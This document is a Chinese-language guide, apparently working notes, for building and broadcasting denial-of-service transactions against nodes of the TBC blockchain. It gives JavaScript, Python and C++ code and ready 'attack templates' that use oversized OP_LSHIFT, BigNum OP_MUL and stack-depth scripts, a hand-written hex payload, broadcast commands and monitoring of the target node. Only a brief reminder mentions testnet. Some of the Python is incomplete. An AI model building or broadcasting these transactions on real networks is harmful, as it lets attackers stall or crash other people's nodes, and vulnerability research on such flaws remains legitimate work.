# TBC 交易构造与攻击实现指南

> 纠正：需要使用 TBC SDK 构造真实交易进行攻击测试
> 更新时间: 2026-03-04

---

## 攻击方式纠正

### 之前的错误理解

我以为用 `decodescript` RPC 就能测试漏洞，但实际上：
- `decodescript` 只是**解码脚本**，不会**执行脚本**
- 漏洞在脚本**执行阶段**才会触发
- 必须构造**真实交易**并发送到网络

### 正确的攻击流程

```
1. 构造包含恶意脚本的交易
2. 使用私钥签名交易
3. 通过 P2P 网络广播交易
4. 矿工/节点验证交易时触发漏洞
5. 观察目标节点的反应
```

---

## TBC 交易结构

### 基本交易格式

```cpp
class CTransaction {
    int32_t nVersion;           // 版本号 (通常为 1 或 2)
    std::vector<CTxIn> vin;     // 输入列表
    std::vector<CTxOut> vout;   // 输出列表
    uint32_t nLockTime;         // 锁定时间
};

class CTxIn {
    COutPoint prevout;          // 引用的前一个输出 (txid + vout)
    CScript scriptSig;          // 解锁脚本 (输入脚本)
    uint32_t nSequence;         // 序列号
};

class CTxOut {
    Amount nValue;              // 金额 (satoshis)
    CScript scriptPubKey;       // 锁定脚本 (输出脚本)
};
```

### 攻击交易构造

**攻击类型 1: P2SH (Pay-to-Script-Hash)**

```
输入:
  - 引用一个正常的 UTXO
  - scriptSig: <签名> <恶意脚本>

输出:
  - 可以是任意类型 (如 OP_RETURN 或正常地址)
```

**攻击类型 2: 直接脚本攻击**

```
输入:
  - 引用包含恶意脚本的 UTXO
  - scriptSig: 提供解锁数据

输出:
  - 任意
```

---

## 使用 TBC SDK 构造攻击交易

### 方案 1: 使用 tbc-lib (JavaScript/TypeScript)

TBC 官方提供的 SDK，最可靠的方式。

```javascript
const TBC = require('tbc-lib');

// 1. 创建私钥和地址
const privateKey = new TBC.PrivateKey('testnet');
const address = privateKey.toAddress();

// 2. 构造恶意脚本
function createLShiftAttackScript(shiftSize = 10000) {
    const script = new TBC.Script();
    
    // PUSH 极大的移位次数
    const shiftCount = Buffer.alloc(shiftSize, 0xff);
    script.add(shiftCount);
    
    // PUSH 要移位的数据
    script.add(Buffer.from([0x01]));
    
    // OP_LSHIFT
    script.add(TBC.Opcode.OP_LSHIFT);
    
    return script;
}

// 3. 构造交易
async function createAttackTransaction(utxo, privateKey) {
    const tx = new TBC.Transaction();
    
    // 添加输入
    tx.from(utxo);
    
    // 添加输出 (可以是 OP_RETURN 或正常输出)
    tx.to(address, 1000);  // 保留少量金额
    
    // 设置恶意脚本作为输入脚本
    const attackScript = createLShiftAttackScript(10000);
    tx.inputs[0].setScript(attackScript);
    
    // 签名
    tx.sign(privateKey);
    
    return tx;
}

// 4. 广播交易
async function broadcastTransaction(tx) {
    const txid = await TBC.Network.broadcast(tx.serialize());
    return txid;
}
```

### 方案 2: 使用 Python + RPC

如果 TBC 提供了类似 Bitcoin Core 的 `signrawtransactionwithkey`，可以用 Python 构造原始交易。

```python
#!/usr/bin/env python3
"""
使用 TBC RPC 构造攻击交易
需要 TBC 节点支持 signrawtransactionwithkey 或类似接口
"""

import json
import hashlib
import struct

class TBCTransactionBuilder:
    """TBC 交易构造器"""
    
    def __init__(self, rpc_client):
        self.rpc = rpc_client
    
    def create_raw_transaction(self, inputs, outputs):
        """
        创建原始交易
        
        参数:
            inputs: [{"txid": "...", "vout": 0, "scriptPubKey": "..."}]
            outputs: [{"address": "...", "amount": 1000}]
        """
        # 使用 createrawtransaction RPC
        tx_inputs = [{"txid": inp["txid"], "vout": inp["vout"]} for inp in inputs]
        tx_outputs = {out["address"]: out["amount"] for out in outputs}
        
        result = self.rpc.call("createrawtransaction", [tx_inputs, tx_outputs])
        return result["result"]
    
    def add_malicious_script(self, raw_tx_hex, input_index, malicious_script_hex):
        """
        在指定输入位置添加恶意脚本
        
        注意: 这需要手动修改原始交易字节
        """
        # 解析交易
        tx_bytes = bytes.fromhex(raw_tx_hex)
        
        # 这里需要实现交易解析和修改逻辑
        # 比较复杂，建议使用 SDK
        
        return modified_tx_hex
    
    def sign_transaction(self, raw_tx_hex, private_key, prevtxs):
        """
        签名交易
        
        参数:
            raw_tx_hex: 原始交易十六进制
            private_key: 私钥 WIF 格式
            prevtxs: 前一个交易信息
        """
        result = self.rpc.call("signrawtransactionwithkey", [
            raw_tx_hex,
            [private_key],
            prevtxs
        ])
        return result["result"]["hex"]
    
    def broadcast_transaction(self, signed_tx_hex):
        """广播交易"""
        result = self.rpc.call("sendrawtransaction", [signed_tx_hex])
        return result["result"]


# 使用示例
def create_lshift_attack_transaction():
    """构造 LSHIFT DoS 攻击交易"""
    
    # 1. 准备 UTXO (需要有测试网的 TBC)
    utxo = {
        "txid": "...",  # 你的 UTXO
        "vout": 0,
        "scriptPubKey": "...",
        "amount": 100000  # satoshis
    }
    
    # 2. 构造恶意脚本
    # PUSH 10000 bytes 的 0xff
    # PUSH 0x01
    # OP_LSHIFT
    malicious_script = (
        "4e" +  # OP_PUSHDATA4
        "10270000" +  # 10000 in little endian
        "ff" * 10000 +  # 10000 bytes of 0xff
        "01" +  # PUSH 1 byte
        "01" +  # data: 0x01
        "98"    # OP_LSHIFT
    )
    
    # 3. 构造交易
    # 这需要完整的交易构造逻辑...
    
    return tx_hex
```

### 方案 3: 使用 C++ 直接修改 TBC 源码

最灵活但最复杂的方式，可以直接在 TBC 代码中添加测试功能。

```cpp
// 在 TBC 源码中添加测试交易生成功能
// 文件: src/test/exploit_tests.cpp

#include "test/test_bitcoin.h"
#include "script/script.h"
#include "primitives/transaction.h"

CMutableTransaction CreateLShiftAttackTx() {
    CMutableTransaction tx;
    tx.nVersion = 1;
    tx.nLockTime = 0;
    
    // 添加输入
    CTxIn input;
    input.prevout = COutPoint(uint256S("..."), 0);  // 测试 UTXO
    
    // 构造恶意脚本
    CScript maliciousScript;
    std::vector<uint8_t> shiftCount(10000, 0xff);  // 10000 bytes of 0xff
    maliciousScript << shiftCount;
    maliciousScript << OP_1;
    maliciousScript << OP_LSHIFT;
    
    input.scriptSig = maliciousScript;
    tx.vin.push_back(input);
    
    // 添加输出
    CTxOut output;
    output.nValue = 1000;
    output.scriptPubKey = CScript() << OP_RETURN;
    tx.vout.push_back(output);
    
    return tx;
}
```

---

## 攻击交易构造步骤

### 步骤 1: 获取测试网 TBC

```bash
# 1. 启动测试网节点
tbcd -testnet -daemon

# 2. 创建测试网地址
tbc-cli -testnet getnewaddress

# 3. 从水龙头获取测试币
# 或使用测试网挖矿 (如果支持)
```

### 步骤 2: 准备 UTXO

```bash
# 查看可用 UTXO
tbc-cli -testnet listunspent

# 记录:
# - txid
# - vout
# - scriptPubKey
# - amount
```

### 步骤 3: 构造攻击脚本

根据漏洞类型选择脚本:

**LSHIFT DoS**:
```
OP_PUSHDATA4 10000_bytes_of_0xff
OP_1
OP_LSHIFT
```

**BigNum MUL DoS**:
```
OP_PUSHDATA4 10000_bytes_of_data
OP_PUSHDATA4 10000_bytes_of_data
OP_MUL
```

**Stack Depth**:
```
# 重复 100000 次
OP_1
OP_1
OP_1
...
```

### 步骤 4: 构造并签名交易

使用 SDK 或 RPC:

```javascript
// 使用 tbc-lib
const tx = new TBC.Transaction()
    .from(utxo)
    .to(address, 1000)
    .change(address)
    .fee(1000);

// 添加恶意脚本到输入
tx.inputs[0].setScript(maliciousScript);

// 签名
tx.sign(privateKey);

// 序列化
const txHex = tx.serialize();
```

### 步骤 5: 广播交易

```bash
# 使用 RPC
tbc-cli -testnet sendrawtransaction <tx_hex>

# 或使用 SDK
await TBC.Network.broadcast(txHex);
```

---

## 监控攻击效果

### 目标节点监控

```bash
# 1. 监控日志
tail -f ~/.tbc/testnet3/debug.log | grep -E "(AcceptToMemoryPool|CheckInputs|VerifyScript)"

# 2. 监控资源使用
htop
# 或
ps aux | grep tbcd

# 3. 监控网络连接
tbc-cli -testnet getpeerinfo
```

### 测试指标

1. **交易接受时间**: 正常 < 100ms，漏洞触发可能 > 10s
2. **CPU 使用率**: 正常 < 10%，漏洞触发可能 100%
3. **内存使用**: 监控 RSS 增长
4. **RPC 响应**: 验证期间 RPC 是否仍然响应

---

## 攻击脚本模板

### 模板 1: LSHIFT DoS (tbc-lib)

```javascript
const TBC = require('tbc-lib');

async function lshiftAttack(privateKeyWif, utxo) {
    const privateKey = TBC.PrivateKey.fromWIF(privateKeyWif);
    const address = privateKey.toAddress();
    
    // 构造恶意脚本
    const script = new TBC.Script();
    const shiftCount = Buffer.alloc(10000, 0xff);
    script.add(shiftCount);
    script.add(Buffer.from([0x01]));
    script.add(TBC.Opcode.OP_LSHIFT);
    
    // 构造交易
    const tx = new TBC.Transaction()
        .from(utxo)
        .to(address, 1000)
        .fee(10000);
    
    // 替换输入脚本
    tx.inputs[0].setScript(script);
    
    // 签名
    tx.sign(privateKey);
    
    return tx;
}

// 使用
const utxo = {
    txId: '...',
    outputIndex: 0,
    script: '...',
    satoshis: 100000
};

lshiftAttack('cVtF...', utxo)
    .then(tx => console.log('Attack TX:', tx.serialize()))
    .catch(err => console.error('Error:', err));
```

### 模板 2: BigNum MUL DoS

```javascript
async function bignumMulAttack(privateKeyWif, utxo) {
    const privateKey = TBC.PrivateKey.fromWIF(privateKeyWif);
    
    const script = new TBC.Script();
    const num1 = Buffer.alloc(10000, 0x42);
    const num2 = Buffer.alloc(10000, 0x43);
    script.add(num1);
    script.add(num2);
    script.add(TBC.Opcode.OP_MUL);
    
    const tx = new TBC.Transaction()
        .from(utxo)
        .to(address, 1000)
        .fee(10000);
    
    tx.inputs[0].setScript(script);
    tx.sign(privateKey);
    
    return tx;
}
```

---

## 注意事项

### ⚠️ 重要提醒

1. **仅在测试网使用**这些攻击代码
2. **确保你有足够的测试币**支付手续费
3. **准备节点重启脚本**，以防节点卡住
4. **先在小规模测试**，确认效果后再进行大规模测试

### 测试网准备清单

- [ ] TBC 测试网节点运行中
- [ ] RPC 访问配置正确
- [ ] 测试网地址有余额
- [ ] 监控工具就绪 (htop, tail 等)
- [ ] 节点重启脚本准备就绪

---

## 下一步

1. **确认 TBC SDK 可用性**:
   - 是否有 `tbc-lib` 或类似 SDK?
   - RPC 接口是否支持 `signrawtransactionwithkey`?

2. **准备测试环境**:
   - 启动测试网节点
   - 获取测试币
   - 配置 RPC

3. **实施攻击测试**:
   - 构造攻击交易
   - 广播到网络
   - 监控效果

---

*本文档纠正了之前的错误理解，提供了正确的交易攻击实现方式*
